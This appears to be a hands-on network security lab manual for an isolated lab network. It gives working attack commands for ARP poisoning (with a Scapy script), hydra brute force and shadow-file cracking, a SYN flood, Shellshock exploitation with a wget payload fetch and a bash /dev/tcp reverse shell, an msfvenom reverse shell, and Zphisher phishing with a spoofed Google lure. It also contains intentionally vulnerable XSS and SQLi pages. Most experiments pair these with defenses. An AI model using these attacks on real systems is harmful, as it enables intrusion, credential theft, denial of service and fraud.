
### **Experiment 1: Packet Sniffing**

---

#### **Server**

```bash
# Update package lists and install nginx
sudo apt-get update
sudo apt-get install -y nginx

# Create a simple unencrypted HTML login form
sudo tee /var/www/html/index.html >/dev/null << 'EOF'
<html><body>
<form action="/login" method="post">
<input name="username" placeholder="Username"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Login</button>
</form>
</body></html>
EOF

# Enable and start the nginx service
sudo systemctl enable --now nginx
```

---

#### **Workstation**

```bash
# Update package lists and install tshark
sudo apt-get update
sudo apt-get install -y tshark
# During installation, select "Yes" when asked if non-superusers should be able to capture packets.

# Identify your network interface (e.g., eth0)
ip a

# Start capturing HTTP traffic on the correct interface and save it to a file
# Replace 'eth0' with your actual interface name if different
sudo tshark -i eth0 -f "tcp port 80" -w user_login.pcap

# After generating traffic, press Ctrl+C in this terminal to stop the capture.

# Analyse the capture file to find credentials from POST requests
tshark -r user_login.pcap -Y "http.request.method == POST" -T fields \\
-e urlencoded-form.value
```

---

#### **User**

*No terminal commands are needed for this device.*

1.  Open a web browser.
2.  Navigate to the web server's address: `http://192.168.10.12`.
3.  Enter a username (e.g., `admin`) and a password (e.g., `password123`) into the form.
4.  Click the **Login** button.

---
---

### **Experiment 2: Network Reconnaissance and Analysis**

---

#### **Attacker**

```bash
# Install arp-scan for Layer 2 host discovery
sudo apt-get update
sudo apt-get install -y arp-scan

# Scan the local network for live hosts
sudo arp-scan --localnet

# Install nmap for comprehensive network scanning
sudo apt-get install -y nmap

# Nmap: Host Discovery (Ping Scan) on the subnet
nmap -sn 192.168.10.0/24

# Nmap: TCP SYN "Stealth" Scan on a specific host
sudo nmap -sS 192.168.10.12

# Nmap: Service and Version Detection on specific ports
sudo nmap -sV -p 22,80 192.168.10.12

# Nmap: Operating System Fingerprinting
sudo nmap -O 192.168.10.10

# Nmap: Aggressive Scan (OS, Version, Script Scan, Traceroute)
sudo nmap -A 192.168.10.12

# Nmap: NSE Script Scan for vulnerabilities
sudo nmap --script vuln 192.168.10.12

# Install dirb for web content discovery
sudo apt-get install -y dirb

# Run a directory scan against the web server using a common wordlist
# Note: The path to wordlists might vary.
dirb http://192.168.10.12 /usr/share/dirb/wordlists/common.txt
```

---

#### **Workstation**

*No terminal commands are needed for this device.*

1.  This section focuses on using the GUI-based tool Wireshark for deep packet analysis.
2.  Analysis is performed on captured `.pcap` files or live traffic.

---
---

### **Experiment 3: Man-in-the-Middle Attacks**

---

#### **Attacker: Initial Attack Steps**

```bash
# (Optional) MAC Spoofing for Evasion
# Install macchanger
sudo apt-get install -y macchanger
# Bring the interface down, change MAC, and bring it back up
sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up
# Manually re-assign static IP after spoofing
sudo ip address flush dev eth0
sudo ip address add 192.168.10.11/24 dev eth0
sudo ip route add default via 192.168.10.1

# Enable IP Forwarding to allow traffic to pass through your machine
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Flush firewall rules to ensure traffic is not blocked
sudo iptables -F
sudo iptables -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

# --- Automated Attack with arpspoof ---
# Install dsniff suite
sudo apt-get update
sudo apt-get install -y dsniff

# In Terminal 1: Poison the User, telling it you are the Server
sudo arpspoof -i eth0 -t 192.168.10.10 192.168.10.12

# In Terminal 2: Poison the Server, telling it you are the User
sudo arpspoof -i eth0 -t 192.168.10.12 192.168.10.10

# --- Manual Attack with Scapy ---
# Step 1: Gather MAC addresses
# Ping both targets to populate your ARP cache
ping -c 1 192.168.10.10
ping -c 1 192.168.10.12
# Display the ARP cache to find the MAC addresses
arp -a

# Step 2: Prepare and run the Scapy script
# Install dependencies
sudo apt install python3-pip
sudo pip3 install scapy

# Save the following Python code as 'arp_poisoner.py'
```
```python
# arp_poisoner.py
from scapy.all import ARP, Ether, sendp
import time, sys, os

def send_arp(target_ip, spoof_ip, target_mac, restore_mac=None):
    # If restoring, use the real MAC of the spoofed IP. Otherwise, use our own MAC.
    # Note: Scapy will use your interface's MAC automatically if hwsrc is not set.
    pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=restore_mac)
    sendp(pkt, count=4 if restore_mac else 1, verbose=0, iface="eth0")

if __name__ == '__main__':
    if len(sys.argv) != 5 or os.geteuid() != 0:
        sys.exit("Usage: sudo python3 arp_poisoner.py <target1_ip> <target2_ip> <target1_mac> <target2_mac>")

    _, target1_ip, target2_ip, target1_mac, target2_mac = sys.argv
    print(f"[+] Poisoning {target1_ip} <-> {target2_ip}. Press CTRL+C to stop.")
    try:
        while True:
            send_arp(target1_ip, target2_ip, target1_mac) # Poison Target 1
            send_arp(target2_ip, target1_ip, target2_mac) # Poison Target 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring ARP tables...")
        # To restore, send ARP replies with the CORRECT MAC addresses
        send_arp(target1_ip, target2_ip, target1_mac, restore_mac=target2_mac)
        send_arp(target2_ip, target1_ip, target2_mac, restore_mac=target1_mac)
        print("[+] Done.")
```
```bash
# Step 3: Execute the attack (replace with real MACs from 'arp -a')
# **IMPORTANT** Ensure this is all on one line
sudo python3 arp_poisoner.py 192.168.10.10 192.168.10.12 AA:BB:CC:11:22:33 DD:EE:FF:44:55:66

# --- Results and Analysis ---
# While the attack is running, capture traffic in a new terminal
# Install and run Wireshark
sudo apt-get update && sudo apt-get install -y wireshark
sudo wireshark -i eth0
# Set display filter in Wireshark: http.request.method == "POST"
# Right-click the packet and select Follow > TCP Stream
```

---

#### **User: Generate Traffic**

1.  While the Attacker's poisoning script is running, open a web browser.
2.  Navigate to `http://192.168.10.12`.
3.  Submit credentials (e.g., `testuser` / `MyPassword123`).
4.  The credentials should be visible on the Attacker's Wireshark capture.

---

#### **Defense Methods and Verification**

*After successfully performing the attack, apply the following defense on the **User** node and then attempt the attack again to observe the impact.*

---

#### **User: Apply Defense**

```bash
# Create a static, permanent ARP entry for the Server on the User node.
# This prevents the User's ARP cache from being poisoned for the Server's IP.
# You must replace <SERVER_REAL_MAC_ADDRESS> with the actual MAC address of the server.
sudo arp -s 192.168.10.12 <SERVER_REAL_MAC_ADDRESS>
```
*After applying this defense, re-run the `arpspoof` or Scapy script on the **Attacker** node. You will observe that you can no longer intercept the traffic between the User and the Server, as the User node will now ignore your spoofed ARP packets regarding the server.*

---
---

### **Experiment 4: Brute-Force Attacks on Services**

---

#### **Server: Setup**

```bash
# Install SSH server and a text editor
sudo apt update
sudo apt install -y openssh-server nano

# Open the SSH config file to enable password authentication
sudo nano /etc/ssh/sshd_config
# In the editor, find the line '#PasswordAuthentication yes' or 'PasswordAuthentication no'
# and ensure it is set to 'PasswordAuthentication yes' (and uncommented).

# Restart the SSH service to apply the configuration changes
sudo systemctl restart ssh

# Create vulnerable user accounts with weak passwords
sudo adduser testuser
# Set password to: password123
sudo adduser dev_user
# Set password to: sunshine
sudo adduser test_user_02
# Set password to: princess

# Make the shadow file readable for the offline attack stage
sudo chmod 644 /etc/shadow
```

---

#### **Attacker: Setup**

```bash
# Install the necessary attack tools
sudo apt install -y hydra nano
sudo snap install john

# Create a custom username list
nano usernames.txt
# Add the following lines to the file, then save and exit:
# root
# admin
# user
# testuser
# dev_user
# test_user_02

# Create a custom password list
nano passwords.txt
# Add the following lines to the file, then save and exit:
# 123456
# password
# qwerty
# sunshine
# welcome

# Download the rockyou.txt wordlist for the offline attack
wget [https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
```

---

#### **Attacker: Attack Execution**

```bash
# Stage 1: Online Brute-Force Attack with Hydra
hydra -L usernames.txt -P passwords.txt ssh://192.168.10.12

# Stage 2: Acquire Hashes for Offline Attack
# Create a directory to store loot and move into it
mkdir loot
cd loot

# Use the compromised credentials (dev_user:sunshine) to download password files
scp dev_user@192.168.10.12:/etc/passwd .
scp dev_user@192.168.10.12:/etc/shadow .
# Enter 'sunshine' when prompted for the password.

# Combine the passwd and shadow files into a crackable format
unshadow passwd shadow > hashes_to_crack.txt

# Stage 3: Offline Cracking with John the Ripper
# Use the large wordlist to crack the combined hash file
john --wordlist=../rockyou.txt hashes_to_crack.txt

# To view the cracked passwords again later
john --show hashes_to_crack.txt
```

---

#### **Defense Methods and Verification**

*After the attack, apply these defenses on the **Server**. Then, re-run the `hydra` attack from the **Attacker** node to see the effect.*

---

#### **Server: Apply Defenses**

```bash
# --- Defense 1: Rate Limiting with Fail2ban ---
# Install Fail2ban
sudo apt install -y fail2ban

# Create a local copy of the configuration to avoid being overwritten by updates
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Edit the local configuration
sudo nano /etc/fail2ban/jail.local
# Find the [sshd] section and ensure it contains:
# enabled = true
# maxretry = 3
# bantime = 10m

# Restart Fail2ban to apply the new jail
sudo systemctl restart fail2ban

# --- Defense 2: Public Key Authentication (Most Secure) ---
# Edit the SSH config file again
sudo nano /etc/ssh/sshd_config
# Change 'PasswordAuthentication yes' to 'PasswordAuthentication no'

# Restart the SSH service
sudo systemctl restart ssh
```

---

#### **Attacker/User: Setup Public Key Auth**

```bash
# This must be done to access the server after password auth is disabled.
# Step 1: Generate a new SSH key pair on the client machine
ssh-keygen -t rsa -b 4096

# Step 2: Copy the public key to the server for a specific user
ssh-copy-id testuser@192.168.10.12
# You will need to do this BEFORE disabling password authentication on the server.
```

### **Experiment 5: Denial-of-Service Attacks**

---

#### **Server: Setup and Observation**

```bash
# Verify the Nginx web server is running
sudo systemctl status nginx

# Install net-tools to monitor network connections
sudo apt install -y net-tools

# During the attack, run this command to observe the exhausted connection table
sudo netstat -tuna | grep SYN_RECV
```

---

#### **Attacker: Setup and Attack Execution**

```bash
# Install hping3, a packet crafting tool
sudo apt update
sudo apt install -y hping3

# Launch the SYN flood attack against the server's web port (80)
# This sends a high volume of SYN packets from random source IPs
sudo hping3 -S --flood -V --rand-source 192.168.10.12 -p 80

# Press Ctrl+C in this terminal to stop the attack.
```

---

#### **User: Verify Service Unavailability**

```bash
# Install curl to test web connectivity
sudo apt install -y curl

# While the attack is running, attempt to access the web server
# This request should hang and eventually time out
curl [http://192.168.10.12](http://192.168.10.12)
```

---

#### **Defense Methods and Verification**

*After confirming the vulnerability, apply the following firewall rules on the **Server** node. Then, re-launch the attack from the **Attacker** node to verify the defense is effective.*

---

#### **Server: Apply and Verify Defenses**

```bash
# Apply iptables rules to rate-limit new incoming SYN packets
# Rule 1: Allow a burst of 10 new connections, then limit to 5 per minute
sudo iptables -A INPUT -p tcp --syn -m limit --limit 5/m --limit-burst 10 -j ACCEPT

# Rule 2: Drop all other new SYN packets that exceed the limit
sudo iptables -A INPUT -p tcp --syn -j DROP

# After re-launching the attack, view the firewall statistics
# The packet counter for the DROP rule should increase rapidly
sudo iptables -L -v -n
```

---

#### **Attacker: Re-launch Attack for Verification**

```bash
# Re-run the exact same hping3 command after the server's defenses are in place
sudo hping3 -S --flood -V --rand-source 192.168.10.12 -p 80
```

### **Experiment 6: Shellshock - Remote Code Execution via CGI**

---

#### **Server: Build and Deploy Vulnerable Service**

```bash
# Create a project directory and navigate into it
mkdir shellshock_lab
cd shellshock_lab

# Install git and clone the pre-configured project
sudo apt-get update
sudo apt-get install -y git
git clone [https://github.com/stanly363/ARMShellshockDocker](https://github.com/stanly363/ARMShellshockDocker)
cd ARMShellshockDocker

# Build the custom Docker image for the vulnerable service
# This may take several minutes
sudo docker build --no-cache -t my-shellshock-lab .

# Run the container from the custom-built image
# This maps port 8080 on the server to port 80 inside the container
sudo docker run --rm -d -p 8080:80 --name vulnerable-apache my-shellshock-lab
```

---

#### **Attacker: Vulnerability Detection**

```bash
# Install discovery tools
sudo apt install -y dirb nmap

# Scan the server for open ports and services
# The vulnerable service should be found on port 8080
sudo nmap -sS -sV -p 8080 192.168.10.12

# Discover web content, specifically looking for CGI scripts
# Target port 8080 where the service is running
dirb [http://192.168.10.12:8080](http://192.168.10.12:8080)
```

---

#### **Attacker: Exploitation (Proof of Concept)**

```bash
# Send a payload that instructs the server to create a file in /tmp
# A '500 Internal Server Error' is the expected response
curl -H 'User-Agent: () { :;}; /usr/bin/touch /tmp/pwned' \
[http://192.168.10.12:8080/cgi-bin/vulnerable.sh](http://192.168.10.12:8080/cgi-bin/vulnerable.sh)
```

---

#### **Server: Verify Proof of Concept**

```bash
# Check inside the running Docker container for the file created by the exploit
sudo docker exec vulnerable-apache ls /tmp
# Seeing 'pwned' confirms remote code execution was successful.
```

---

#### **Attacker: Exploitation (Gaining a Reverse Shell)**

*This multi-stage attack requires three separate terminals on the Attacker node.*

```bash
# --- Main Terminal: Prepare and send payloads ---

# Create the reverse shell script payload
echo '#!/bin/bash' > shell.sh
echo '/bin/bash -i >& /dev/tcp/192.168.10.11/4444 0>&1' >> shell.sh

# Stage 1: Trigger the vulnerability to make the server download your script
# **IMPORTANT** Ensure this is all on one line
curl -H 'User-Agent: () { :;}; /usr/bin/wget [http://192.168.10.11:8000/shell.sh](http://192.168.10.11:8000/shell.sh) -O /tmp/shell.sh' [http://192.168.10.12:8080/cgi-bin/vulnerable.sh](http://192.168.10.12:8080/cgi-bin/vulnerable.sh)

# Stage 2: Trigger the vulnerability again to execute the downloaded script
curl -H 'User-Agent: () { :;}; /bin/bash /tmp/shell.sh' \
[http://192.168.10.12:8080/cgi-bin/vulnerable.sh](http://192.168.10.12:8080/cgi-bin/vulnerable.sh)

# --- Terminal 2: Start a web server to host the payload ---
# Leave this running in the foreground
python3 -m http.server 8000

# --- Terminal 3: Start a listener to catch the reverse shell ---
# Leave this running in the foreground. You should receive a connection after Stage 2.
nc -lvnp 4444
```

---

#### **Attacker: Verify Reverse Shell**

*After executing Stage 2, your listener terminal (Terminal 3) should show a new connection.*

```bash
# The netcat listener will show a connection and provide a shell prompt
# You can now run commands on the server as the 'www-data' user
$ whoami
www-data
$ ls -la /
...
```

### **Experiment 7: Malware Emulation and Detection**

---

#### **Server: Setup (The Target)**

```bash
# Update package lists
sudo apt-get update

# Install logging and auditing tools
sudo apt-get install -y logwatch auditd

# Create an audit rule to log all command executions system-wide
sudo auditctl -a always,exit -F arch=b64 -S execve -k command_execution
```

---

#### **Attacker: Setup (The C2 Server)**

```bash
# Download and install the Metasploit Framework via snap
sudo snap install metasploit-framework
sudo snap connect metasploit-framework:network-control :network-control

# Add snap binaries to your PATH for the current session
export PATH=$PATH:/snap/bin
```

---

#### **Attacker: Payload Generation and Delivery**

```bash
# Use msfvenom to generate a staged Linux reverse shell payload
sudo msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=192.168.10.11 \
LPORT=4444 -f elf -o reverse_shell.elf

# Start a simple web server to host the payload for delivery
# Run this in the same directory as reverse_shell.elf and leave it running
python3 -m http.server 8000
```

---

#### **Attacker: C2 Listener Setup**

```bash
# Launch the Metasploit console
sudo msfconsole

# Inside the msfconsole prompt, configure the listener
# These settings must match the payload generation step
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/aarch64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.10.11
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

---

#### **Server: Payload Execution (Victim Simulation)**

```bash
# Download the malicious payload from the attacker's web server
wget [http://192.168.10.11:8000/reverse_shell.elf](http://192.168.10.11:8000/reverse_shell.elf)

# Make the downloaded file executable
chmod +x reverse_shell.elf

# Execute the payload to establish the C2 connection
./reverse_shell.elf
```

---

#### **Server: Host-Based Detection and Analysis**

```bash
# After the payload has been executed, run Logwatch to generate a report
# The auditd logs will show the execution of the malicious commands
sudo logwatch --range Today

# Alternatively, you can search the audit logs directly for the file
sudo ausearch -i -f ./reverse_shell.elf
```

### **Experiment 8: Phishing Attacks**

---

#### **Server: Mail Server & Client Setup**

```bash
# Install Postfix (mail server) and Mutt (email client)
sudo apt-get update
sudo apt-get install -y postfix mutt
# During Postfix installation, select 'Internet Site'.
# For 'System mail name', enter 'internal-workspace.co.uk'.

# Edit the main Postfix configuration file
sudo nano /etc/postfix/main.cf
# --- In the editor, ensure the following values are set correctly ---
# myhostname = server.internal-workspace.co.uk
# mydomain = internal-workspace.co.uk
# myorigin = $mydomain
# mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
# home_mailbox = Maildir/
# --- Save and exit the editor ---

# Add the lab's local network to the list of trusted networks
# **IMPORTANT**: Ensure this command is typed or pasted as a single, continuous line.
sudo postconf -e "mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 192.168.10.0/24"

# Restart the Postfix service to apply all changes
sudo systemctl restart postfix

# Create the target user for the phishing attack
sudo adduser testuser
# When prompted, set a password (e.g., password123).

# --- The following steps configure Mutt for the new user ---

# Log in as testuser
su - testuser

# Create the Mutt configuration file with the correct mailbox settings
# (This command creates the .muttrc file and adds the required lines)
tee ~/.muttrc > /dev/null <<'EOF'
set folder = "~/Maildir"
set spoolfile = "~/Maildir"
set mbox_type = Maildir
EOF

# You can now exit the testuser session by typing 'exit'
exit
```

---

#### **Attacker: Phishing Framework & Email Tool Setup**

```bash
# Install dependencies for Zphisher and the email spoofing tool (swaks)
sudo apt-get update
sudo apt-get install -y git curl php openssh-client swaks nano

# Clone the Zphisher repository
git clone [https://github.com/htr-tech/zphisher.git](https://github.com/htr-tech/zphisher.git)

# Navigate into the Zphisher directory and launch it
cd zphisher
bash zphisher.sh

# --- Follow the Zphisher prompts ---
# 1. Select the template (e.g., 03 for Google).
# 2. Select the server option (e.g., Cloudflared).
# 3. Note the generated URL (e.g., https://random-string).
# --- Leave this terminal running to keep the phishing page active ---
```

---

#### **Attacker: Lure Crafting & Delivery**

*Open a new terminal on the Attacker node for these commands, leaving Zphisher running.*

```bash
# Create the phishing email content in a file named 'google_lure.txt'
# Replace '<generated>' with the actual URL from Zphisher
tee google_lure.txt > /dev/null <<'EOF'
Subject: Security Alert: Your Account Was Accessed From a New Device
Hi there,
A sign-in attempt was just blocked on your Google Workspace account from
an unrecognised device.
For your security, please review your account activity and confirm it was
you by logging in via the link below:
http://<generated>
If you do not recognise this activity, your password may have been
compromised.
Thank you,
The Google Security Team
EOF

# Use swaks to send the spoofed email to the target
# **IMPORTANT** Ensure this is all on one line
swaks --to testuser@internal-workspace.co.uk --from "'Google Security' <no-reply@google.com>" \
--server 192.168.10.12 --body google_lure.txt
```

---

#### **User Simulation (On Server Node)**

```bash
# Log in to the server as the target user
su - testuser

# Launch the email client to read the phishing email
mutt

# --- User Actions ---
# 1. Open the email from "Google Security".
# 2. In a graphical web browser on the Server, navigate to the Cloudflared URL from the email.
# 3. Enter credentials (e.g., 'testuser@internal-workspace.co.uk' and 'MyComplexP@ssw0rd!') into the fake login page.
```

---

#### **Attacker: Verify Credential Capture**

*Switch back to the terminal where Zphisher is running on the Attacker node.*

```
# Zphisher's output will display the captured credentials in real-time.
[+] Account Found!
================================================
[+] Email : testuser@internal-workspace.co.uk
[+] Password : MyComplexP@ssw0rd!
================================================
[+] Saved in : sites/google/usernames.txt
[+] Waiting for Next Target...
```

### **Experiment 9: Hardening Edge Devices**

---

#### **Edge Device (Generic Hardening Steps)**

*The following commands are general hardening steps applicable to a Linux-based edge device, such as the Server or Workstation nodes in the lab.*

##### **1. Operating System Hardening**

```bash
# Purge unnecessary software (replace <package_name> with the actual package)
sudo apt-get autoremove --purge <package_name>

# To harden the kernel, add the following lines to /etc/sysctl.conf
# net.ipv4.ip_forward = 0
# net.ipv4.tcp_syncookies = 1

# Apply the new kernel parameters without rebooting
sudo sysctl -p
```

---

##### **2. Firewall and Access Control (UFW)**

```bash
# Install Uncomplicated Firewall (UFW)
sudo apt-get update
sudo apt-get install -y ufw

# Set default policies: deny all incoming, allow all outgoing
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow traffic from a specific trusted subnet (e.g., the lab network)
sudo ufw allow from 192.168.10.0/24

# Enable the firewall (will ask for confirmation)
sudo ufw enable
```

---

##### **3. Automated Security Auditing (Lynis)**

```bash
# Install the Lynis auditing tool
sudo apt-get install -y lynis

# Run a system audit and review the suggestions
sudo lynis audit system
```

### **Experiment 10: AI-Powered Intrusion Detection**

---

#### **Workstation: Model Training (Optional)**

*Run this script to train a new model on PCAP files located in the pcap_samples directory.*

```bash
# Run the training pipeline to create new model artifacts
python AITrain.py
```

---

#### **Workstation: Live IDS Analysis**

*Run these commands on the workstation connected to the network's mirror port.*

```bash
# --- On Linux/macOS ---

# 1. Identify your network interface name (e.g., eth0, en0)
ip a

# 2. Run the IDS using the pre-trained model (recommended)
# Replace 'eth0' with your actual interface name
sudo python IDS.py --i eth0 --use-pretrained

# 3. (Alternatively) Run the IDS using your self-trained model
# Replace 'eth0' with your actual interface name
sudo python IDS.py --i eth0


# --- On Windows ---

# 1. Identify your network interface name (e.g., "Ethernet")
getmac /v

# 2. Run the IDS using the pre-trained model (recommended)
# Replace "Ethernet" with your actual interface name
python IDS.py --i "Ethernet" --use-pretrained

# 3. (Alternatively) Run the IDS using your self-trained model
# Replace "Ethernet" with your actual interface name
python IDS.py --i "Ethernet"
```

---

#### **Attacker: Attack Simulation**

*Run this command from a separate machine on the network to generate traffic for the IDS to detect.*

```bash
# Launch a network scan against another device (e.g., the Server at 192.168.10.12)
nmap -T4 -p- 192.168.10.12
```

### **Appendix A: Additional Attack Techniques**

---

#### **A.1: DNS Spoofing and Cache Poisoning**

*Assumes an ARP Spoofing MitM attack is already active against the User node (192.168.10.10).*

##### **Attacker**

```bash
# Install the dsniff suite if not already present
sudo apt-get update
sudo apt-get install -y dsniff

# Create a hosts file to define the redirection rule
echo "192.168.10.11 [www.example.com](https://www.example.com)" > dns.hosts

# Launch dnsspoof to intercept and forge DNS responses
# Run this in a new terminal
sudo dnsspoof -i eth0 -f dns.hosts
```

##### **User**

```bash
# Flush the local DNS cache to ensure a new request is made
sudo systemd-resolve --flush-caches

# Attempt to connect to the target domain
ping [www.example.com](https://www.example.com)
# Observe the ping request going to the Attacker's IP (192.168.10.11)
```

---

#### **A.2: Session Hijacking via Cookie Theft**

##### **Server**

```bash
# Install PHP-FPM for Nginx
sudo apt-get update
sudo apt-get install -y php-fpm

# Edit the default Nginx site configuration to enable PHP processing
sudo nano /etc/nginx/sites-available/default
# Inside the editor, find and uncomment the 'location ~ \.php$' block.
# It should look similar to this:
#
# location ~ \.php$ {
#   include snippets/fastcgi-php.conf;
#   fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # Path may vary
# }
#
# Save and exit the editor.

# Create the vulnerable PHP login page
sudo tee /var/www/html/session.php >/dev/null << 'EOF'
<?php
session_start();
if (isset($_POST['username'])) {
$_SESSION['loggedin'] = true;
$_SESSION['username'] = $_POST['username'];
}
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
echo "<h1>Welcome, " . $_SESSION['username'] . "! You are logged in.</h1>";
exit;
}
?>
<html><body><form action="session.php" method="post">
<input name="username" placeholder="Username"><br>
<button type="submit">Login</button></form></body></html>
EOF

# Test the Nginx configuration and reload the service
sudo nginx -t && sudo systemctl reload nginx
```

##### **Workstation / User / Attacker**

*This part of the exercise uses GUI tools (Wireshark, Web Browser) and does not have specific terminal commands.*

1.  **Workstation:** Start Wireshark and filter for `http.cookie`.
2.  **User:** Browse to `http://192.168.10.12/session.php` and log in.
3.  **Workstation:** Note the `PHPSESSID` cookie value from the Wireshark capture.
4.  **Attacker:** Browse to the same URL, use browser developer tools to change your cookie value to the one captured, and refresh the page to hijack the session.

---

#### **A.3: Cross-Site Scripting (XSS)**

##### **Server**

```bash
# Create the vulnerable PHP page that reflects user input without sanitisation
sudo tee /var/www/html/xss.php >/dev/null << 'EOF'
<h1>Welcome, <?php echo $_GET['name']; ?>!</h1>
EOF
```

##### **User**

*This attack is performed by tricking a user into visiting a crafted URL. No commands are run on the user's terminal.*

1.  Navigate to the following URL in a web browser:
    `http://192.168.10.12/xss.php?name=<script>alert('XSS')</script>`
2.  Observe the alert box pop-up, confirming the script execution.

---

#### **A.4: SQL Injection (SQLi)**

##### **Server**

```bash
# Install SQLite and the PHP driver
sudo apt-get install -y sqlite3 php-sqlite3

# Create the vulnerable PHP login script with an insecure SQL query
sudo tee /var/www/html/sqli.php >/dev/null << 'EOF'
<?php
$db = new SQLite3('/var/www/html/users.db');
$db->exec("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)");
$db->exec("INSERT OR IGNORE INTO users VALUES ('admin', 'secret_password')");
if (isset($_POST['username'])) {
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
$result = $db->querySingle($query, false);
if ($result) { echo "<h1>Login Successful!</h1>"; }
else { echo "<h1>Login Failed.</h1>"; }
exit;
}
?>
<html><body><form action="sqli.php" method="post">
<input name="username" placeholder="Username"><br>
<input name="password" placeholder="Password"><br>
<button type="submit">Login</button></form></body></html>
EOF

# Set correct ownership and permissions for the web server to create the database
sudo chown -R www-data:www-data /var/www/html
sudo chmod -R 775 /var/www/html
```

##### **User**

*This attack is performed by entering a malicious string into a web form.*

1.  Browse to `http://192.168.10.12/sqli.php`.
2.  In the **Username** field, enter the following text: `' OR '1'='1';--`
3.  Leave the **Password** field blank.
4.  Click **Login** to bypass authentication.



